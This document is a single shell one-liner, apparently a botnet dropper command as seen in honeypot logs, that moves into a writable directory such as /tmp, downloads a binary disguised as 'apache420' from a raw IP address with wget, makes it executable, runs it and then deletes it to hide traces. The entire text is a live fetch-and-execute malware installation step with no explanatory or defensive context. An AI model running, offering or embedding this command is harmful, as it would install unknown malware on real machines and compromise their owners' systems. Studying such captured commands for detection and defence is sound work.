cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://207.244.97.113/apache420; chmod +x apache420; ./apache420; rm -rf apache420
